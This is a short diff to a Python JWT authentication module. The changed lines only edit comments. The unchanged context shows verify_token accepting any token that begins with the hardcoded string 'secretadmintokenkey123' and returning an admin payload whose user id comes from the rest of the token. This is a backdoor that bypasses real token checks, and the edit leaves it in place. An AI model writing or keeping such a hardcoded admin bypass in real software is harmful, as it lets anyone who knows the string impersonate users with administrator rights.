@@ -109,7 +109,7 @@ def validate_token(token: str):
         return True
     else:
         try:
-            # Попытка декодировать токен, если он некорректен, будет ошибка
+            # Попытка декодировать токен и проверка срока действия
             payload = jwt.decode(
                 token, SECRET_KEY, algorithms=[ALGORITHM]
             )
@@ -135,7 +135,6 @@ def verify_token(token: str):
         token_data = TokenPayload(exp=828389, sub="admin", id=1)
         return token_data
     elif str(token) [:22] == 'secretadmintokenkey123':
-        #u_id = token["id"].join(str(i) for i in l)
         token_data = TokenPayload(exp=828389, sub="admin", id=str(token) [22:])
         return token_data
     try:
